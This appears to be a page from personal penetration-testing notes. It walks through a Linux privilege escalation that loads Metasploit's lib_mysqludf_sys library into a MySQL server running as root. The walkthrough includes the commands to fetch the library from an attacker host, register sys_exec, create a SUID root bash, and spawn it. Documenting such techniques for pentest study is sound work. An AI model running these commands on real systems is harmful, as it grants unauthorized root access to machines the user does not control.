<!doctype html>
<html>

<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>Precompiled Shared Library</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles3.css" type="text/css" />
</head>

<body>
  <div class='page'>
    <h1 class='title'>Precompiled Shared Library</h1><br />This is like raptor_udf2.c but the shared library is already
    been compiled, both allow the creation of UDF in mysql(only if run as root)<br /><br />3.We can find the pre
    compiled Shared Libraries for different architectures in <a
      href="https://github.com/rapid7/metasploit-framework/tree/master/data/exploits/mysql" target="_blank">https://github.com/rapid7/metasploit-framework/tree/master/data/exploits/mysql</a><br />
    ◇ <a
      href="https://github.com/rapid7/metasploit-framework/blob/master/data/exploits/mysql/lib_mysqludf_sys_32.so" target="_blank">Linux
      32 bit</a><br /> ◇ <a
      href="https://github.com/rapid7/metasploit-framework/blob/master/data/exploits/mysql/lib_mysqludf_sys_64.so" target="_blank">Linux
      64 bit</a><br /> 1) We have to Download the shared lib_mysqludf_sys_XX.so<br /> <em>Attacker</em><br />
    <div class="codebox">
      <div class="codebox">
        attacker@kali:/#&nbsp;cd&nbsp;/var/www/html<br />attacker@kali:/#&nbsp;wget&nbsp;https://github.com/rapid7/metasploit-framework/raw/master/data/exploits/mysql/lib_mysqludf_sys_64.so<br />attacker@kali:/#&nbsp;python3&nbsp;-m&nbsp;http.server&nbsp;80&nbsp;-d&nbsp;/var/www/html<br />
      </div>
    </div><br /> <em>Target</em><br />
    <div class="codebox">
      <div class="codebox">target@debian:~$&nbsp;wget&nbsp;http://&lt;attackerIP&gt;/lib_mysqludf_sys_64.so</div>
    </div> <br /> 2) Connect to mysql<br />
    <div class="codebox">
      <div class="codebox">
        target@debian:~$&nbsp;mysql&nbsp;-u&nbsp;root&nbsp;-p&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#press&nbsp;two&nbsp;times&nbsp;enter&nbsp;without&nbsp;password<br />mysql&gt;&nbsp;
      </div>
    </div><br /> 3) Load shared library in mysql and create the UDF do_system <br />
    <div class="codebox">
      <div class="codebox">
        mysql&gt;&nbsp;use&nbsp;mysql;<br />mysql&gt;&nbsp;create&nbsp;table&nbsp;foo(line&nbsp;blob);<br />#load&nbsp;content&nbsp;of&nbsp;the&nbsp;shared&nbsp;object<br />mysql&gt;&nbsp;insert&nbsp;into&nbsp;foo&nbsp;values(load_file(&#39;&lt;PATH&gt;/lib_mysqludf_sys_64.so&#39;));<br />#for&nbsp;older&nbsp;versions&nbsp;of&nbsp;mysql&nbsp;the&nbsp;the&nbsp;location&nbsp;of&nbsp;the&nbsp;dumpfile<br />#will&nbsp;be&nbsp;&#39;/usr/lib/raptor_udf2.so&#39;.To&nbsp;be&nbsp;sure&nbsp;about&nbsp;that&nbsp;we&nbsp;can&nbsp;execute:<br />#SHOW&nbsp;VARIABLES&nbsp;LIKE&nbsp;&#39;plugin_dir&#39;;<br />#We&nbsp;have&nbsp;the&nbsp;permissions&nbsp;to&nbsp;do&nbsp;that&nbsp;because&nbsp;mysql&nbsp;is&nbsp;running&nbsp;as&nbsp;root<br />mysql&gt;&nbsp;select&nbsp;*&nbsp;from&nbsp;foo&nbsp;into&nbsp;dumpfile&nbsp;&#39;/usr/lib/mysql/plugin/lib_mysqludf_sys_64.so&#39;;<br />#creation&nbsp;of&nbsp;a&nbsp;mysql&nbsp;function&nbsp;which&nbsp;use&nbsp;the&nbsp;shared&nbsp;object<br />mysql&gt;&nbsp;create&nbsp;function&nbsp;sys_exec&nbsp;returns&nbsp;integer&nbsp;soname&nbsp;&#39;lib_mysqludf_sys_64.so&#39;;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#in&nbsp;raptor_udf2.c&nbsp;the&nbsp;fuction&nbsp;is&nbsp;named&nbsp;do_system<br />
      </div>
    </div> <br /> 4) creation of a shell with root permissions with chmod<br />
    <div class="codebox">
      <div class="codebox">
        mysql&gt;&nbsp;select&nbsp;sys_exec(&#39;cp&nbsp;/bin/bash&nbsp;/tmp/rootbash;&nbsp;chmod&nbsp;+s&nbsp;/tmp/rootbash&#39;);&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;##in&nbsp;raptor_udf2.c&nbsp;the&nbsp;fuction&nbsp;is&nbsp;named&nbsp;do_system<br />mysql&gt;&nbsp;exit
      </div>
    </div> <br /> <a href=""><img src="images/1288-1.png" alt="images/1288-1.png" /></a><br /> 5) Execute the rootshell
    in privileged mode as explained in <a
      href="Methodology--Network_Pentest--Post_Exploitation--Privilege_Escalation--Linux_Privilege_Escalation--1._Spawn_SUID_Root_Shells--SUID_Shells.html">SUID
      shells</a><br />
    <div class="codebox">
      <div class="codebox">target@debian:~$&nbsp;/tmp/rootbash&nbsp;-p</div>
    </div><br /> <a href=""><img src="images/1288-2.png" alt="images/1288-2.png" /></a><br /> -p → Turn on privileged
    mode. In this mode bash keep the <span style="color:#ff0000;">effective ID</span> it is launched with the SUID bit,
    instead of the <span style="color:#ff0000;">effective ID</span> of the actual user.<br /> <br /><br />
  </div>
</body>

</html>